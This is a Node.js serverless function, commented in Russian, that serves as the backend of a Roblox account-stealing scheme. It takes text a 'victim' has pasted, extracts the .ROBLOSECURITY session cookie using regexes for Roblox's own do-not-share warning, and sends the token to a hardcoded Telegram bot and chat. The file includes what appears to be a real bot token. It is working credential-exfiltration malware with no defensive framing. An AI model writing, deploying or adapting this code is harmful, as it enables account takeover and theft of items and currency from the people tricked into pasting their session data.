const fetch = require('node-fetch');

// ===== ТВОИ ДАННЫЕ (ЗАХАРДКОЖЕНЫ) =====
const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
const CHAT_ID = "-5527664230";
// ========================================

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { victim, code } = JSON.parse(event.body);
        if (!victim || !code) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
        }

        // Извлечение токена – сначала ищем полный с предупреждением
        let token = null;
        const warningPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^"]+/;
        const warningMatch = code.match(warningPattern);
        if (warningMatch) {
            token = warningMatch[0];
        } else {
            // Если нет – ищем .ROBLOSECURITY=...
            const roblosecPattern = /\.ROBLOSECURITY=([^;\s"]+)/;
            const secMatch = code.match(roblosecPattern);
            if (secMatch) {
                token = secMatch[1];
            }
        }

        if (!token) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
        }

        // Отправка в Telegram (используем захардкоженные данные)
        const message = `🆕 Token for ${victim}:\n${token}`;
        const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!tgResponse.ok) {
            const errText = await tgResponse.text();
            console.error('Telegram error:', errText);
            return { statusCode: 500, body: JSON.stringify({ error: 'Failed to send to Telegram' }) };
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ token })
        };
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};